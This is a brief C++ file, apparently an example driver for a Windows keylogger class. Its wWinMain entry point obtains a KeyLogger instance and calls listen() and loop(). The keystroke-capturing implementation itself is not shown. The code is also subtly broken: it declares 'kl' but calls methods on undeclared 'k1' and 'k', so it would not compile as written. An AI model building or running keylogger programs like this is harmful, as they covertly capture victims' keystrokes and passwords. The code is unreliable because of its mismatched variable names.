/*
Example standalone program using the keylogger class
*/

#include "keylogger.h"

int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
{

    KeyLogger* kl = KeyLogger::getInstance();

    k1->listen();

    k->loop();
    
    return 0;
}